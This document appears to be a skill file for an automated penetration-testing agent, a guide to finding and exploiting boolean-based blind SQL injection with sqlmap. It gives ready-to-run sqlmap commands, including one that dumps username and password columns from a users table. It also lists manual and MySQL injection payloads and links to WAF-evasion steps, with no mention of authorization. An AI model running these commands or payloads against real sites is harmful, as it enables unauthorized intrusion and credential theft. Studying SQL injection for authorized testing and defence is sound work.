# Skill: Boolean-Based Blind SQL Injection

## Metadata
- Phase: detection
- Techniques: B
- DB Targets: all
- Risk Level: low
- Prerequisites: target URL with injectable parameter

## When to Use

Use when the application returns **different content, length, or status** for logically true vs. false conditions, but does **not** display actual query results or error messages. This is one of the most common injection types in modern applications.

Indicators:
- Page shows content when condition is true (e.g., product details)
- Page shows empty/different content when condition is false (e.g., "not found")
- Response **length** or **HTTP status** differs between true/false

## How Boolean-Blind Works

SQLMap injects conditions like:
- True: `AND 1=1` (page renders normally)
- False: `AND 1=2` (page renders differently)

Then extracts data character by character using bisection:
- `AND ASCII(SUBSTR(username,1,1))>77` → true/false
- 7 requests per character on average using binary search

## Minimum Viable Command

```bash
sqlmap -u "http://target.com/page.php?id=1" --technique=B --batch
```

## Recommended Full Command

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=B \
  --dbms=mysql \
  --batch \
  --level=1 \
  --risk=1 \
  --threads=5 \
  -v 2
```

## Speed Optimization for Boolean-Blind

Boolean-blind is inherently slower than error-based or UNION. Optimize with:

```bash
# More threads = faster extraction
sqlmap -u "TARGET" --technique=B --threads=10

# Specify character set to reduce requests
sqlmap -u "TARGET" --technique=B --charset="0123456789abcdefghijklmnopqrstuvwxyz"

# Extract only what you need (skip enumeration)
sqlmap -u "TARGET" --technique=B -D dbname -T users -C "username,password" --dump
```

## Manual Verification Payloads

Confirm boolean-blind manually before running sqlmap:

```sql
-- Should return normal page (true)
?id=1 AND 1=1--
?id=1 AND 'a'='a'--

-- Should return empty/error page (false)
?id=1 AND 1=2--
?id=1 AND 'a'='b'--

-- If both return same page -> NOT boolean-blind vulnerable
-- If different -> confirm with content length comparison
```

## Step-by-Step

1. Verify parameter responds differently to true/false
2. Run detection command
3. Confirm injection point in sqlmap output
4. Proceed to enumeration with `--dbs`

## Expected Output
```
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
```

## Payload Examples (MySQL)

| Purpose | Payload |
|---------|---------|
| Basic true | `1 AND 1=1` |
| Basic false | `1 AND 1=2` |
| Version check | `1 AND SUBSTRING(VERSION(),1,1)='8'` |
| User check | `1 AND USER()='root@localhost'` |
| DB name | `1 AND SUBSTRING(DATABASE(),1,1)='t'` |

## Red Flags (wrong skill)
- App always returns same response regardless of payload -> try time-based blind instead
- Response differs but inconsistently (dynamic content) -> time-based more reliable
- App shows DB errors -> use error-based instead (faster)

## Follow-Up
- Injection confirmed -> [Database Enumeration](../03_exploitation/database_enumeration.md)
- WAF blocking -> [WAF Evasion](../02_waf_evasion/tamper_selection_guide.md)
- Need faster extraction -> check if error-based also works: `--technique=BE`
